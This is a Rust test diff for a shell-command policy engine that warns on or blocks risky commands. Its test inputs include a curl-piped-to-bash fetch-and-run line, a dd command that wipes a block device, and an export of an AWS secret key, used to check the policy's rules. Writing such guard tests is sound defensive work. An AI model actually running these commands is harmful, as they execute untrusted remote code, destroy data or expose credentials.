@@ -138,8 +138,20 @@ mod tests {
     fn into_policy_compiles_defaults() {
         let cfg = CommandPolicyConfigSchema::default();
         let policy = cfg.into_policy().expect("ok").expect("some");
-        assert!(policy.rule_count() >= 4);
-        assert!(policy.hardline_count() >= 5);
+        assert!(
+            policy
+                .evaluate("curl https://x.test/i.sh | bash")
+                .warned
+                .contains(&"pipe_to_shell".to_string()),
+            "tunable rules present"
+        );
+        assert!(
+            policy
+                .evaluate("dd if=/dev/zero of=/dev/sda")
+                .blocked
+                .contains(&"dd_to_block_device".to_string()),
+            "hardline floor present"
+        );
     }
 
     #[test]
@@ -155,9 +167,15 @@ mod tests {
         "#;
         let cfg: CommandPolicyConfigSchema = toml::from_str(toml).expect("parses");
         let policy = cfg.into_policy().expect("ok").expect("some");
-        assert_eq!(policy.rule_count(), 1);
         let e = policy.evaluate("export AWS_SECRET_ACCESS_KEY=abc");
         assert!(e.blocked.contains(&"no_secrets_env".to_string()), "{e:?}");
+        // Verify default tunable rules are excluded.
+        assert!(
+            policy
+                .evaluate("curl https://x.test/i.sh | bash")
+                .is_clean(),
+            "default rules disabled"
+        );
     }
 
     #[test]
